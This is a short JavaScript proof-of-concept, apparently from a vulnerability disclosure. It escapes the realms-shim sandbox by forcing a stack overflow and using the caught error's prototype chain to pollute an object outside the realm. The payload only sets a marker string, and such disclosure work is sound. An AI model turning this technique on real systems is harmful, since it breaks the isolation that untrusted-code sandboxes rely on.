rs = require("realms-shim")
let realm = rs.makeRootRealm();
realm.evaluate(`
function test() {    
    try {
       test();
    } catch (e) {                        
        e.__proto__.__proto__.__proto__.polluted = "success";        
        new Error().stack; // if one comments this uselss line, the PoC does not work anymore
    }
}
test();`);
console.log(polluted)
